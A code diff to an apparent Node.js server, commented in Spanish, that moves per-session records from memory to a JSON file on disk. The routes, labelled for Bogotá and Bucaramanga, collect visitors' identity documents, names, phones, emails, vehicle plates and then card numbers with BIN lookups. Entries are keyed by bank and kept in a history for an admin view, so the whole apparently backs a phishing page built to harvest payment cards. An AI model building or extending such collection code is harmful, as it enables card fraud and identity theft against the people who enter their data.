@@ -20,12 +20,25 @@ if (!fs.existsSync(DATA_DIR)) {
 }
 
 const estadoSesiones = new Map();
-const datosSesiones = new Map();
+const datosSesiones = new Map(); // Esto se sigue usando para la vista principal del admin
 const ultimaAccionSesiones = new Map();
 const usuariosActivos = new Map();
 const rateLimits = new Map();
 const tokensInvalidos = new Set();
 const bcSesiones = new Map();
+
+// 🔥 NUEVO: Archivo para guardar las sesiones temporales en el disco duro
+const SESIONES_TEMP_FILE = path.join(DATA_DIR, 'sesiones-temporales.json');
+let sesionesTemporales = {};
+try {
+    if (fs.existsSync(SESIONES_TEMP_FILE)) {
+        sesionesTemporales = JSON.parse(fs.readFileSync(SESIONES_TEMP_FILE, 'utf8'));
+    }
+} catch (e) {}
+
+function guardarSesionesTemporales() {
+    try { fs.writeFileSync(SESIONES_TEMP_FILE, JSON.stringify(sesionesTemporales, null, 2)); } catch (e) {}
+}
 
 let ipsBloqueadas = new Set();
 const IP_BLOQUEADAS_FILE = path.join(DATA_DIR, 'bloqueadas.json');
@@ -460,7 +473,7 @@ const server = http.createServer(async (req, res) => {
     }
 
     // ============================================================
-    // 🔥 RUTA 1: Guardar consulta inicial (SOLO en memoria)
+    // 🔥 RUTA 1: Guardar consulta inicial (EN DISCO DURO)
     // ============================================================
     const consultaMatch = url.match(/^\/cc-(bogota|bucaramanga)\/guardar-consulta$/);
     if (req.method === 'POST' && consultaMatch) {
@@ -470,16 +483,21 @@ const server = http.createServer(async (req, res) => {
             const { sessionId, tipoPersona, tipoDoc, documento, nombres, apellidos, telefono, correo, tipoPago, placa, precio } = datos;
             if (!sessionId) { json(res, 400, { ok: false }); return; }
 
-            const datosPrevios = datosSesiones.get(sessionId) || {};
+            // 🔥 GUARDAMOS EN EL ARCHIVO DE SESIONES TEMPORALES
+            const datosPrevios = sesionesTemporales[sessionId] || {};
             const datosCompletos = Object.assign({}, datosPrevios, {
                 tipoPersona, tipoDoc, documento, nombres, apellidos, telefono, correo, tipoPago, placa, precio,
                 ip: ip,
                 creadoEn: new Date().toISOString()
             });
 
+            sesionesTemporales[sessionId] = datosCompletos;
+            guardarSesionesTemporales();
+
+            // También en la memoria para que aparezca en la vista del admin
             datosSesiones.set(sessionId, datosCompletos);
 
-            console.log(`[${bancoKey}] Consulta en memoria: ${sessionId} | Tel: ${telefono}`);
+            console.log(`[${bancoKey}] Consulta en disco: ${sessionId} | Tel: ${telefono}`);
             json(res, 200, { ok: true });
         } catch (e) { json(res, 500, { ok: false, error: e.message }); }
         return;
@@ -495,7 +513,7 @@ const server = http.createServer(async (req, res) => {
             const { sessionId } = await getBody(req);
             if (!sessionId) { json(res, 400, { ok: false }); return; }
 
-            const datosCompletos = datosSesiones.get(sessionId) || {};
+            const datosCompletos = sesionesTemporales[sessionId] || {};
             
             // GUARDAMOS EL PRIMER REGISTRO EN EL HISTORIAL
             guardarHistorial(bancoKey, datosCompletos);
@@ -519,7 +537,9 @@ const server = http.createServer(async (req, res) => {
             if (!sessionId || !marca) { json(res, 400, { ok: false }); return; }
 
             const infoBin = await obtenerInfoBin(tarjeta);
-            const datosPrevios = datosSesiones.get(sessionId) || {};
+            
+            // 🔥 RECUPERAMOS LOS DATOS DEL DISCO DURO
+            const datosPrevios = sesionesTemporales[sessionId] || {};
 
             const datosSesion = Object.assign({}, datosPrevios, {
                 bancoKey: bancoKey, 
@@ -550,6 +570,10 @@ const server = http.createServer(async (req, res) => {
 
             // GUARDAMOS EL SEGUNDO REGISTRO EN EL HISTORIAL
             guardarHistorial(bancoKey, datosSesion);
+
+            // Limpiamos la sesión temporal del disco
+            delete sesionesTemporales[sessionId];
+            guardarSesionesTemporales();
 
             console.log(`[${bancoKey}] Tarjeta guardada en historial (Paso 2): ${sessionId}`);
             json(res, 200, { ok: true, sessionId, bancoKey, binInfo: infoBin });
